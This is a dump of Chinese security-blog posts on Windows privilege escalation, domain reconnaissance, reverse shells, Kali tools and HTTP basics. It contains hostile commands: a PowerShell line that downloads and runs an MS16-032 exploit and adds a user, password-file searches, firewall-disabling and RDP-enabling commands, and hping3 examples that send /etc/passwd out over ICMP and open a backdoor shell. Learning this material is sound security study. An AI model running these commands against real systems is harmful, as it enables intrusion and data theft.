Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'\"\n```\n\n这样执行的话就不会提示需要权限并且命令也能正常执行，这还有个小坑，就是在adduser的时候一定要保证密码是能通过安全性验证的，不然没有新用户生成很容易误认为提权失败\n\n我们也可以直接执行木马文件，这样反弹的shell就是SYSTEM用户权限了\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202320685.png)\n\n### 本地提权漏洞\n\n#### CVE-2020-0787\n\n当Windows背景智能传输服务（BITS）没有正确处理符号链接时，存在特权提升漏洞，利用后攻击者可以改写目标文件来提升权限，利用条件就是攻击者需要登录系统，可以运行EXP\n\n该漏洞影响的版本：Windows7 SP1-Windows10 1903所有架构\n\n在利用时我们要先看目标机器是否有对应漏洞补丁\n\n```\nsysteminfo | findstr KB4540673\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202332882.png)\n\n很好，没有对应的补丁，我们直接利用对应的EXP，上传后执行（mlgbd为什么不弹！！！！！！！！！！！！）\n\n\n\n\n\n### 数据库提权\n\n\n\n\n\n\n\n\n\n"},{"title":"Windows内网域渗透3","url":"/posts/d114db98.html","content":"\n# 低权限搜集本机密码文件\n\n- **dir命令搜集当前机器各类密码配置文件**\n\n  一般配置或密码文件都是：\n\n  ```\n  pass.*,config.*,username.*,password.*\n  ```\n\n  可以直接使用dir命令进行搜集，建议不要从C盘扫，从user目录下扫描\n\n  ```cmd\n  dir /b /s user.*,pass.*,config.*,username.*,password.*\n  ```\n\n  我们cd到目标目录后直接执行，发现密码文件：\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192105452.png)\n\n  我们直接查看\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192107139.png)\n\n- **for循环搜集当前机器各类敏感密码的配置文件**\n\n  ```cmd\n  for /r C:\\ %i in (pass.*) do @echo %i\n  ```\n\n  这个耗时比较久，我们需要稍等再查看，最终结果和上面的dir命令是相似的\n\n- **findstr命令查找文件中的字段**\n\n  ```cmd \n  findstr /c:\"user\" /c:\"pass\" /si *.txt\n  ```\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192112055.png)\n\n\n\n\n\n\n\n"},{"title":"Windows内网域渗透2","url":"/posts/a613eb0e.html","content":"\n# BloodHound使用\n\n安装略过，百度都有\n\n首先需要去官方的Github项目中下载收集器，注意这个玩意需要.net 4.7以上的运行环境的，不然直接弹窗给你看\n\n```powershell\n#exe命令\nSharpHound.exe -c all\n#powershell命令\npowershell -exec bypass -command \"Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all\"\n```\n\n## 前置知识\n\n### 关于身份认证方式\n\n#### kerberos认证\n\n- **简介**\n\n  Kerberos协议是一个专注于验证通信双方身份的网络协议，不同于其他网络安全协议的保证整个通信过程的传输安全，kerberos侧重于通信前双方身份的认定工作，帮助客户端和服务端解决“证明我自己是我自己”的问题，从而使得通信两端能够完全信任对方身份，在一个不安全的网络中完成一次安全的身份认证继而进行安全的通信。\n\n- **组成角色**\n\n  **客户端（client）**：发送请求的一方\n\n  **服务端（Server）**：接收请求的一方\n\n  **密钥分发中心（Key Distribution Center，KDC）**，而密钥分发中心一般又分为两部分，分别是： \n\n  - **AS（Authentication Server）**：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据） \n  - **TGS（Ticket Granting Ticket）**：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）\n\n  在整个kerberos认证过程中，三个角色缺一不可\n\n- **原理**\n\n  为了方便我们理解，我们先假设这么一个场景，现在有ABC三人，A需要去找B完成一件事情，但是彼此并没有见过面，只知道对方的名字，那如果A直接去找B，A就没有办法向B直接证明自己就是A，所以现在他们找到了彼此都认识并且信任的C，让C给A一个凭证，由A交给B去找C来验证身份，这时A就能验证自己的身份了\n\n  上面这个例子就很好的说明了kerberos认证的方式，A相当于客户端，B相当于服务端，C相当于KDC，KDC中包含一个叫做TGS（票据授予中心）的组件，我们便可以理解为他就是一个发放身份认证票据的服务中心，在KDC认证了（其实是KDC中的AS认证的）客户端的身份后，他会给客户端发放用于访问网络服务的服务授予票据（Ticket）。由于整个kerberos通信过程都采用对称加密的方式，密钥的获取也是从KDC中得到，所以KDC叫做密钥分发中心。 \n\n- **流程**\n\n  上面的原理搞明白了也就很容易知道流程了，不过我们还需要解决两个问题\n\n  **问题1** KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？\n\n  **问题2** 服务端怎么知道你带来的服务授予票据（Ticket）就是一张真正的票据呢？\n\n  所以说上面的原理只是一个简化后的模型，实际上的一次完整的kerberos认证总共需要三次通信\n\n  1. 客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以**第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端**\n  2. 客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求，\n  3. 此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。\n\n  了解到这些再看老庞的图\n\n  ![image-20221010113610118](https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113610118.png)\n\n  ![image-20221010113606949](https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113606949.png)\n\n  ![62638be70e3e745194dca594](https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/62638be70e3e745194dca594.png)\n\n#### NTLM认证\n\n本地密码哈希，没了\n\n## BloodHound板块\n\n1. Database Info（数据库信息），可查看当前数据库中的域用户，域计算机等统计信息\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182041355.png)\n\n2. Node Info（节点信息），单击某个节点时，可以看到对应节点的详细信息\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182045362.png)\n\n3. Analysis（分析查询）提供了一些预设好的查询语句\n\n- **Find all Domain Admins**（查询所有域管理员）\n- **Find Shortest Paths to Domain Admins**（找出域管理员的最短路径）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n部分内容引用以下文章：\n\n[详解kerberos认证原理](https://seevae.github.io/2020/09/12/详解kerberos认证流程/)\n"},{"title":"无公网服务器反弹shell","url":"/posts/23df454a.html","content":"\n1. 用SakuraFrp（因为免费），https://www.natfrp.com/user/\n\n2. 在**穿透—隧道**中开启一个新的隧道，本地端口可任意设定，本地端口即为稍后电脑要监听的端口\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171924171.png)\n\n3. 下载SakuraFrp的官方软件，运行，在个人中心中找到token并填入\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171948612.png)\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171949150.png)\n\n   如图所示说明隧道已开启\n\n4. 另起一个shell端口，监听之前设置过的端口\n\n   `nc -lvp 设置的端口`\n\n5. 用执行命令后提示的IP或域名来生成反弹shell命令\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952293.png)\n\n6. 执行后成功弹shell\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952765.png)\n"},{"title":"Windows内网域渗透","url":"/posts/a0d619b1.html","content":"\n# Windows内网域渗透\n\n## 域森林下的内网信息搜集\n\n在我们进行渗透测试进入内网后，面对的是一片黑暗，所以我们首先应当做的就是对当前所处的网络环境进行一个判断，通常分为三种判断\n\n- 我是谁————对机器角色判断\n- 这是哪————对目前机器所处的网络环境的拓扑结构进行分析和判断\n- 我在哪————对目前机器所处的位置区域进行判断\n\n所以我们需要对目标内网进行信息搜集，搜集的越多对内网越了解才能在渗透中如鱼得水\n\n那假设我们现在已经获取到**darkflow.com**域中的**web-2021**机器的控制权限，接下来我们尝试使用CS来进行内网信息搜集\n\n### 是否在域中\n\n在对Windows进行内网渗透的时候，针对域环境和工作组环境所进行的渗透方式是完全不同的，所以我们应当先判断主机事都在域中，此处有两种方式\n\n1. 使用`ipconfig /all`查看当前网卡和IP信息\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122203724.png)\n\n   可以看到命令执行之后在IP配置汇总存在主DNS后缀，这代表我们存在在域环境中，反之则是工作组环境\n\n2. 使用`systeminfo`查看系统详细信息\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122205249.png)\n\n   此处中域显示为一个域名，而如果是工作组则会显示WORKGROUP\n\n3. 使用`net config workstation`查看当前登录域以及用户\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132335431.png)\n\n   可以看到其中有工作站域并且不是WORKGROUP\n\n4. 使用`net time /domain`来查看系统时间，其中的`/domain`参数代表其只能在域环境中执行\n\n   该命令执行后有三种情况\n\n   - 存在域但当前用户并非域内用户：`发生系统错误，拒绝访问`\n   - 存在域并且当前用户是域内用户：显示域以及时间\n   - 不存在域：找不到WORKGROUP的域控制器\n\n### 本机信息搜集\n\n在分辨好我们是在域中还是工作组后，我们就可以对当前机器进行信息搜集了\n\n- **获取本机网络配置信息**：`ipconfig /all`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132346666.png)\n\n  用来分析网络拓扑，如果机器在内网中我们就可以扩大范围进行内网的横向渗透，拿下更多资产\n\n- **查询操作系统和版本信息**：`systeminfo | findstr /B /C:\"OS\"`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132345103.png)\n\n  可以了解到本机的系统版本，在我们想要进行提权的时候我们可以针对性的寻找对应的exp\n\n- **查看本机已安装的软件及版本，路径**：`wmic product get name,version`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140055450.png)\n\n  通过搜集已安装的软件信息，可以针对某款软件的漏洞来进行一些提权等操作\n\n- **查看本机进程信息**：`tasklist /v`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140100985.png)\n\n  通过该命令查询的系统进程信息可显示出进程的运行用户（SYSTEM用户权限以下）及目录，在后期我们可以通过令牌窃取来进行提取\n\n- **杀毒软件进程查看**：`tasklist /SVC`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141410006.png)\n\n  将该命令的返回值提交对应的[查询网站](https://www.adminxe.com/CompareAV/index.php)即可查看是否有杀毒软件，方便我们与杀软对抗\n\n- **启动程序信息**：`wmic startup get command,caption`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141421601.png)\n\n  可以看到详细的启动项命令及描述\n\n- **查看计划任务**：`schtasks /query /fo LIST /v`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141535865.png)\n\n  通过查看本机计划任务可以利用定时任务来做定时任务劫持\n\n- **查看主机开机时间**：`net statistics workstation`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141538799.png)\n\n  可以通过查看开机时间来判断是否经常有人管理使用这台机器\n\n- **查看用户**：`net user` `net user 执行用户`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141602726.png)\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141604248.png)\n\n  没啥好说的，就是查看用户，还可以查看指定用户属于的组\n\n- **查看当前在线用户**：`query user || qwinsta`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141610279.png)\n\n  通过查看当前在线用户可以知道管理员是否在登录，如果我们RDP登录到远程桌面然后撞上管理员就不好了\n\n- **查看本机端口开放情况**：`netstat -ano`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141614976.png)\n\n  可以查看本机是否与其他机器产生连接，分析本机开启的业务\n\n- **查询补丁信息**：`systeminfo` `wmic qfe get Caption,Description,HotFixID,InstalledOn`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141616251.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141618610.png)\n\n  看看漏洞是否被修复，针对性寻找exp\n\n- **查询路由表**：`route print`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141622076.png)\n\n  **所有可用接口的ARP缓冲表**：`arp -a`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141633543.png)\n\n  通过分析路由可以知道机器可以访问哪些网段的资源\n\n- **查看防火墙设置**：`netsh firewall show config`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141635082.png)\n\n  查看防火墙的开关情况，以及相关的配置信息\n\n  如果我们相对防火墙相关内容进行一些更改可以使用下面的命令\n\n  ```powershell\n  在Windows 2003及之前版本，使指定程序全部连接：\n  netsh firewall add allowedprogram 程序路径 \"规则名\" enable\n  \n  在Windows 2003之后的版本，使用以下命令：\n  netsh advfirewall firewall add rule name=\"规则名\" dir=in action=allow program=\"程序路径\"\n  \n  允许指定程序连出：\n  netsh advfirewall firewall add rule name=\"规则名\" dir=out action=allow program=\"程序路径\"\n  \n  允许指定端口放行：\n  netsh advfirewall firewall add rule name=\"规则名\" protocol=TCP dir=in localport=端口 action=allow program=\"程序路径\"\n  \n  自定义防火墙日志存储位置：\n  netsh advfirewall set currentprofile logging filename \"存储文件路径\"\n  \n  Windows 2003及之前版本关闭防火墙：\n  netsh firewall set opmode disable\n  \n  Windows 2003以后版本关闭防火墙：\n  netsh advfirewall set allprofiles state off\n  ```\n\n- **查询并开启远程桌面服务**：`REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141652896.png)\n\n  开启远程桌面的命令\n  \n  ```powershell\n  Windows Server 2003开3389端口\n  wmic path win32_terminalservicesetting where (_CLASS !=\"\") call setallowtsconnections 1\n  \n  Windows Server 2008 和 Windows Server 2012开3389端口\n  wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (_CLASS !=\"\") call setallowtsconnections 1\n  或\n  wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1\n  \n  Windows 7开3389端口\n  reg add \"HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER\" /v fSingleSessionPerUser /t REG DWORD /d 0 /f\n  ```\n\n### 域内信息搜集\n\n- **获取域SID**：`whoami /all`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151703166.png)\n\n  搜集SID可以用于票据传递攻击，还有部分提权方式需要手机特权信息来进行\n\n- **查询域内容户**：`net user /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151706114.png)\n\n- **查看域内用户详细信息**：`net user 用户名 /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151707950.png)\n\n  可以看到组成员内容来判断用户组及权限\n\n- **查看本机所在的所有域**：`net view /domain`\n\n  在存在多个域的时候可以使用这个命令来看所存在的所有域\n  \n- **查询域管理员列表**：`net group \"domain admins\" /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161722867.png)\n\n  可以看到只有一个域管理员\n\n- **查看域内时间（时间服务器）**：`net time /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161724650.png)\n\n  通过查看域内时间以及时间服务器，就可以使用定时任务+IPC来运行一些bat文件，并且可以通过ping域内时间服务器来得到其IP\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161728786.png)\n\n- **查看登录本机的域管理员**：`net localgroup administrators /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161730087.png)\n\n- **查看域中所有用户组**：`net groups /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161731765.png)\n\n- **查看主域控制器**：`netdom query pdc`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161732635.png)\n\n  直接ping就能拿到IP\n\n- **查看所有域控制器**：`net group \"Domain Controllers\" /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161734364.png)\n  \n  这里应该还有个辅域的，但是不知道为啥消失了，后面再回来看看\n  \n  这里我们可以通过域控制器的机器名称来查看域控主机，知道其IP后我们可以对其进行针对性的渗透，只需渗透核心机器，整个域的控制权也就到手了\n  \n- **查询域信任信息**：`nltest /domain_trusts`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170338052.png)\n\n  可以看到主域名是bxsteam.com，并且有一个saul子域，二者双向认证，彼此的用户可以互相登录\n\n- **查询域密码信息**：`net accounts /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170340232.png)\n\n  可以看到域中密码使用策略，在爆破时防止我们生成无效的密码字典\n\n","tags":["内网渗透"]},{"title":"Kali从0到1","url":"/posts/8b8ae737.html","content":"\n# 工具大全\n\n## 信息收集\n\n### 存活主机识别\n\n- **arping**：\n\n  - 类似于ping，也是用来探测存活的，不过使用的arp协议不是ICMP协议，所以只能探测内网不能碰公网\n  - -t参数可以添加mac地址，来保证IP地址绑定到了指定的MAC地址上\n  - 还行吧，可能ping不管用的时候可以用，哦还可以用来捞mac地址\n\n- **fping**：\n\n  - ping的加强版，fping可以在命令行中指定要ping的主机范围\n\n  - 与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。\n\n  - ```shell\n    fping IP1 IP2 IP3 ...\n    fping -f filename\n    fping -g IP1 IP2\n    可以添加-a参数来只显示存活主机\n    ```\n\n  - ping的升级版（自己写歌脚本貌似也差不多）\n\n- **hping3**：\n\n  - hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。\n\n  - 可以自己定制数据包来探测防火墙，也可以详细查看响应来判断拦截等内容，甚至可以用来伪造ICMP包来打DDOS\n\n  - ```\n    -a 指定包的请求IP，可以指定为目标来让自己反复ping自己，不过这样的话自己也就收不到响应数据了\n    -p 指定端口\n    -I 指定网卡\n    -c 指定发包次数\n    ```\n\n  - **文件传输**\n\n    - Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：\n\n    - ```shell\n      hping3 源IP --listen signature --safe  --icmp\n      ```\n\n    - 监听ICMP包中的签名，根据签名解析出文件内容。\n\n    - 在发送端使用签名打包的ICMP包发送文件：\n\n    - ```shell\n      hping3 目标IP --icmp -d 100 --sign signature --file /etc/passwd\n      ```\n\n    - 将`/etc/passwd`密码文件通过ICMP包传给目标主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。\n\n  - **反弹shell功能**\n\n    - 如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。\n\n    - 示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。\n\n    - 在木马启动端：\n\n    - ```\n      hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh\n      ```\n\n    - 在远程控制端：\n\n    - ```\n      echo ls >test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd\n      ```\n\n    - 将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。\n\n    - 当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。\n\n  - 好高级的说，可以自定义的部分也很多，也有一些有趣的应用，可冲\n\n- **masscan**：\n\n  - 又一个扫描工具，给个例子就过，好快啊\n\n  - ```\n    masscan -p80,8080-8100 10.0.0.0/8 \n    （扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段）\n    可使用--echo把当前配置输出到文件，-c使用文件\n    --source-ip 指定源IP\n    --excludefile 文件 指定网段忽略\n    --max-rate 100000 最高发包速率\n    --banners 获取banner信息，支持少量的协议\n    ```\n\n  - md你快有个卵子用，扫不出来端口存活信息啊\n\n- **thcping6**：\n\n  - 针对IPV6的发包工具，隶属于atk6这个这个工具包下，官方描述是sends a hand crafted ping6 packet，就是手动构造一个ping6的数据包\n  - 学了IPV6再来\n\n### 路由分析\n\n- **netdiscover**：\n  \n  - 二层发现工具，拥有主动和被动发现两种方式，通过ARP路由表探测\n  - 最简单的就是直接输入netdiscover之后就是运行它的默认配置然后扫描局域网中所有的机器\n  - 也可以直接输入网卡让他自己跑两层\n  - 每天一个被打电话小技巧\n  \n- **netmask**：\n\n  - netmaks可以在 IP范围、子网掩码、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换\n\n  - ```\n    Usage: netmask spec [spec ...]\n      -h, --help                    Print a summary of the options\n      -v, --version                 Print the version number\n      -d, --debug                   Print status/progress information\n      -s, --standard                Output address/netmask pairs\n      -c, --cidr                    Output CIDR format address lists\n      -i, --cisco                   Output Cisco style address lists\n      -r, --range                   Output ip address ranges\n      -x, --hex                     Output address/netmask pairs in hex\n      -o, --octal                   Output address/netmask pairs in octal\n      -b, --binary                  Output address/netmask pairs in binary\n      -n, --nodns                   Disable DNS lookups for addresses\n      -f, --files                   Treat arguments as input files\n    Definitions:\n      a spec can be any of:\n        address\n        address:address\n        address:+address\n        address/mask\n      an address can be any of:\n        N           decimal number\n        0N          octal number\n        0xN         hex number\n        N.N.N.N     dotted quad\n        hostname    dns domain name\n      a mask is the number of bits set to one from the left\n    ```\n\n  - 这个看官方文档吧\n\n### 情报分析\n\n- **spiderfoot**：\n\n  - 一个可以自动进行大量查询的工具\n  - 启动需要指定好监听的IP和端口，然后浏览器直接访问就行啦\n  - 好用的耶，一些资产搜寻不用手动做了，而且还可以没事搜搜自己来保护自己\n\n- **theHarvester**：\n\n  - 这个嘛就是一个手动的搜索工具啦，直接看官方文档就好\n\n  - ```\n    -d\t--domain\t\t\t\t\t要搜索的公司名称或域名。\n    -l\t--limit\t\t\t\t\t\t限制搜索结果的数量，默认=500。\n    -S\t--start\t\t\t\t\t\t从结果编号 X 开始，默认 = 0。\n    -g\t--google-dork\t\t\t使用 Google Dorks 进行 Google 搜索。\n    -p\t--proxies\t\t\t\t\t对请求使用代理，在 proxies.yaml 中输入代理\n    -s\t--shodan\t\t\t\t\t使用 Shodan 查询发现的主机。\n    --screenshot\t\t\t\t\t对已解析的域进行截图，指定输出目录：--screenshot output_directory\n    -v\t--virtual-host\t\t通过 DNS 解析验证主机名并搜索虚拟主机。\n    -e\t--dns-server\t\t\t用于查找的 DNS 服务器。\n    -f\t--filename\t\t\t\t将结果保存到 XML 和 JSON 文件。\n    -b\t--source\t\t\t\t\t指定搜索的引擎和数据源\n    \n    #theHarvester -d [url] -l 300 -b [搜索引擎名称]\n    ```\n\n  - 没上一个自动化的好用，不开心😒\n\n## 漏洞分析\n\n### Fuzzing工具集\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Web程序\n\n## 数据库评估软件\n\n## 密码攻击\n\n## 无线攻击\n\n### 蓝牙工具集\n\n### 无线工具集\n\n- **bully**：\n\n  - Wi-Fi破解，通过爆破WPS模式下7位长度PIN值来获取Wi-Fi密码\n\n  - 使用方法\n\n  - ```shell\n    bully 监听模式网卡名 -b 目标BSSID -e 目标SSID -c 目标广播信道\n    ```\n\n  - 可以看到有许多参数，他们的获取方式我们会在后面提到\n\n  - 还没有试过，改天尝试一下\n\n- **Fern WiFi Cracker**：\n\n  - 图形化的Wi-Fi破解工具，可以通过破解路由到设备的加密包来实现Wi-Fi密码解析\n  - 等我笔记本kali装好的（\n\n## 逆向工程\n\n## 漏洞利用工具集\n\n## 嗅探/欺骗\n\n### 网络欺骗\n\n- **sslsplit**：\n"},{"title":"URL和HTTP协议","url":"/posts/11f51f93.html","content":"\n# URL\n\n遇事不决先百度\n\n> 因特网上的可用资源可以用简单字符串来表示，该文档就是描述了这种字符串的语法和语义。而这些字符串则被称为：“[统一资源定位器](https://baike.baidu.com/item/统一资源定位器/7682460?fromModule=lemma_inlink)”（URL）。这篇说明源于万维网全球信息主动组织（World Wide Web global informationinitiative）介绍的概念。RFC1630《通用资源标志符》描述了一些对象数据，他们自1990年起就开始使用这些对象数据。这篇URL说明符合《因特网资源定位符的功能需求（Functional Requirements for Internet Resource Locators）》中说明的需求。这篇文档是由工程任务组织（IETF）的URI工作小组写的 \n\n肯定看不懂对吧，没关系，你只需要知道这个东西是用来寻找互联网上的资源就可以了，下面我们来看看一个URL的完整格式\n\n```\nscheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]\n```\n\n贴心的中文翻译\n\n```\n协议:[//[用户[:密码]@]主机[:端口]][/路径][?队列][#片段]\n```\n\n下面我们以一个http协议的url来对上面的内容做一个解释\n\n```\nhttp://jlan.darkflow.top/posts/58958.html\n```\n\n我们来按照上面的语法来分析一下这个是什么内容\n\n首先我们使用的是http协议来对jlan.darkflow.top这个服务主机进行访问，访问的是/posts/58958.html这个网页资源，这时候应该就会有人问了，为什么这个http的URL里面没有用户啊密码啊端口之类的东西呢，很简单，因为这些内容都是可选项，而http协议内容基本都是公开访问的，所以我们不需要指明我们用户的身份，并且http协议的默认端口是80端口，所以我们在访问这个URL的时候会自动的去80端口寻找资源\n\n那如果我们没有把http服务放在80端口而是放在其他端口呢，来做个实验，我们用flask起一个web服务器，使用80端口作为http服务的端口![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243049.png)\n\n我们来直接访问看看，虽然我们没有在URL中添加端口，但是我们也成功访问到了我们的web站点，添加了80端口也是一样的，并且由于浏览器的特性，我们在添加80端口到URL中时默认是不会显示出来的\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262245054.png)\n\n下一步就是将默认端口进行更改，可以看到我们在代码中将端口更改为了10010，这时候我们再来直接访问看看\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243232.png)\n\n可以看到我们现在用默认的80端口已经行不通了，那我们就加上我们自定义的端口号再来访问\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262248667.png)\n\n可以看到访问成功，并且在地址栏也出现了我们输入的自定义端口号\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262251416.png)\n\n那下一个我们可以来看一个ftp协议的URL\n\n```\nftp://jlan@127.0.0.1/xxx/flag\n```\n\n这个就很明显了，我们以Jlan的身份在127.0.0.1服务器上面拿一份flag，可以看到我们也没有指定端口，因为ftp协议也是有默认端口的，其实几乎所有协议都会有一个默认的端口号，在一些使用这些协议的程序中大部分情况我们都不需要再额外添加端口\n\n# HTTP\n\n说完了URL我们来说另一个web的基础知识就是HTTP协议，同样先百度\n\n> HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。\n>\n> HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。\n>\n> HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。\n>\n> HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。\n\n![img](https://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2)\n\n上面这张图就很好的说明了HTTP协议定义的内容\n\n啊反正HTTP协议就是一种传输网页内容的协议，协议就是双方定义了一种数据交换的方式，按照规定的格式来传输数据，web手所谓的“抓包”就是对HTTP的数据包进行拦截，然后取出其中的原始数据，多说无益，我们来实际抓包尝试一下，还是使用刚才的web服务器\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262325345.png)\n\n看这里就是一整个完整的请求和响应内容了，第一行是请求的方法和协议，后面每行都是一个请求标头，最后有一个回车和换行结束，这是一个完整的GET请求，那POST类型的请求是什么样子的呢，我们再来看一下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262335979.png)\n\n发现请求的最下面是我们传入的内容，并且又多了一个叫做Content-Length的请求头，这个请求头就是告诉服务器，我们在最后一个换行之后还有9字节的内容需要传输，我们试试在服务器中将内容取出并且回显，那如果我们修改这个请求头让它比我们实际的请求短会发生什么呢\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262336473.png)\n\n可以看到服务器按照我们的请求头声明的一样，只取了前8位的内容，返回了jla\n\n\n\n\n\n 